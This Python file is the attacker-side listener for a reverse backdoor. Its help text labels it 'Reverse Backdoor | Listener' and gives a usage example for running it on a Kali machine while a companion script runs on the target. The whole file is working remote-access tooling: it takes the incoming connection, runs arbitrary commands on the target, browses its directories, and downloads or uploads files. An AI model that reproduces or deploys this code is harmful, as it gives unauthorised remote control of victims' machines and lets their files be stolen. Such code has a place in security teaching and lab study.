#!/usr/bin/python
import socket
import json
import base64
import argparse
import textwrap

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print(f"** listening on [any] {port} ...")
        self.connection, addr = listener.accept()
        print(f"[+] connection established | source: {addr}")

    def send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def receive(self):
        json_data = b''
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def exec(self, cmd):
        self.send(cmd)
        if cmd[0] == "exit":
            self.connection.close()
            exit()
        return self.receive()

    def read_file(self, path):
        with open(path, "rb") as f:
            return base64.b64encode(f.read())
    
    def write_file(self, path, content):
        with open(path, "wb") as f:
            f.write(base64.b64decode(content.encode()))
            return "[*] Downloaded 1 file."

    def run(self):
        while True:
            command = input("> ")
            command = command.split(" ")
            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content.decode())
                elif command[0] == "cd" and len(command) > 2:
                    command[1] = " ".join(command[1:])
                cout = self.exec(command)

                if command[0] == "download" and "[-] Error" not in cout:
                    cout = self.write_file(command[1], cout)
            except Exception:
                cout = "[!] Error executing command..."

            print(cout)

def get_args():
    parser = argparse.ArgumentParser(description="\u001b[38;5;1m======================== Reverse Backdoor | Listener ========================", formatter_class=argparse.RawDescriptionHelpFormatter, epilog=textwrap.dedent('''
    \u001b[38;5;34m
Usage:
        After getting connection from target device we can execute commands, crawl directories, download and upload files.\n
        > [commnad]                - Executes command on target machine.
        > cd [dir]                 - Crawls target system directories.
        > download [file_name]     - Downloads file from target machine.
        > upload [file_name]       - Uploads file from our machine to target device.
        > exit                     - Close connection.
        \n\u001b[38;5;42mExample:
        # On kali machine:
        $ python listener.py --ip 192.168.1.1 --port 4444
        
        # On target machine:
        $ python reverse_backdoor.py --ip 192.168.1.1 --port 4444
        '''))      
    parser.add_argument("-i", "--ip", dest="ip", help="IP address to listen (Your IP).")
    parser.add_argument("-p", "--port", dest="port", help="Port to listen for connections.")
    args = parser.parse_args()
    return args

args = get_args()

listener = Listener(args.ip, int(args.port))
listener.run()
